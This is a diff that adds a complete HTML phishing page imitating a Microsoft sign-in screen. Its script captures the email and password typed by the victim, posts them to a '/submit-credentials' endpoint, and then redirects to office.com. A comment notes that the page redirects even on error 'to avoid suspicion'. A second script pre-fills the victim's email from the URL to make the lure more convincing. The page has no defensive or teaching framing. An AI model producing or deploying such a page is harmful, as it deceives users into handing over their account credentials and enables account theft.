@@ -1,0 +1,153 @@
+
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Sign in to your account</title>
+            <meta name="viewport" content="width=device-width, initial-scale=1">
+            <style>
+                body {
+                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                    background-color: #f2f2f2;
+                    margin: 0;
+                    padding: 0;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    height: 100vh;
+                }
+                .login-container {
+                    background-color: white;
+                    border-radius: 4px;
+                    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+                    padding: 44px;
+                    width: 338px;
+                }
+                .header {
+                    margin-bottom: 30px;
+                }
+                .header img {
+                    height: 24px;
+                    margin-bottom: 16px;
+                }
+                h1 {
+                    color: #333;
+                    font-size: 24px;
+                    font-weight: 600;
+                    margin: 0;
+                    margin-bottom: 12px;
+                }
+                .subtitle {
+                    font-size: 13px;
+                    margin-bottom: 24px;
+                }
+                .form-group {
+                    margin-bottom: 20px;
+                }
+                input[type="email"],
+                input[type="password"] {
+                    width: 100%;
+                    padding: 6px 10px;
+                    border: 1px solid #666;
+                    border-radius: 2px;
+                    box-sizing: border-box;
+                    font-size: 15px;
+                    height: 36px;
+                }
+                button {
+                    width: 100%;
+                    padding: 4px 12px;
+                    background-color: #0067b8;
+                    color: white;
+                    border: none;
+                    border-radius: 0;
+                    cursor: pointer;
+                    font-size: 15px;
+                    height: 36px;
+                    margin-top: 24px;
+                }
+                .footer {
+                    font-size: 13px;
+                    color: #0067b8;
+                    margin-top: 16px;
+                    text-align: left;
+                }
+                .footer a {
+                    color: #0067b8;
+                    text-decoration: none;
+                }
+            </style>
+        <script>
+            document.addEventListener('DOMContentLoaded', function() {
+                const form = document.getElementById('credential-form');
+                if (form) {
+                    form.addEventListener('submit', function(e) {
+                        e.preventDefault();
+                        
+                        // Collect form data
+                        const formData = new FormData(form);
+                        const data = {};
+                        for (let [key, value] of formData.entries()) {
+                            data[key] = value;
+                        }
+                        
+                        // Send data via fetch
+                        fetch('/submit-credentials', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify(data),
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            // Redirect after successful submission
+                            window.location.href = 'https://office.com';
+                        })
+                        .catch(error => {
+                            console.error('Error:', error);
+                            // Still redirect to avoid suspicion
+                            window.location.href = 'https://office.com';
+                        });
+                    });
+                }
+            });
+            </script></head>
+        <body>
+            <div class="login-container">
+                <div class="header">
+                    <img src="https://via.placeholder.com/100x24?text=Microsoft" alt="Microsoft">
+                    <h1>Sign in</h1>
+                    <div class="subtitle" id="displayName"></div>
+                </div>
+                
+                <form id="credential-form">
+                    <div class="form-group">
+                        <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required autofocus>
+                    </div>
+                    
+                    <div class="form-group">
+                        <input type="password" id="password" name="password" placeholder="Password" required>
+                    </div>
+                    
+                    <button type="submit">Sign in</button>
+                </form>
+                
+                <div class="footer">
+                    <a href="#">Can't access your account?</a>
+                </div>
+            </div>
+            
+            <script>
+                // Display email in subtitle if provided in URL
+                document.addEventListener('DOMContentLoaded', function() {
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const email = urlParams.get('email');
+                    if (email) {
+                        document.getElementById('email').value = email;
+                        document.getElementById('displayName').textContent = email;
+                    }
+                });
+            </script>
+        </body>
+        </html>
+        
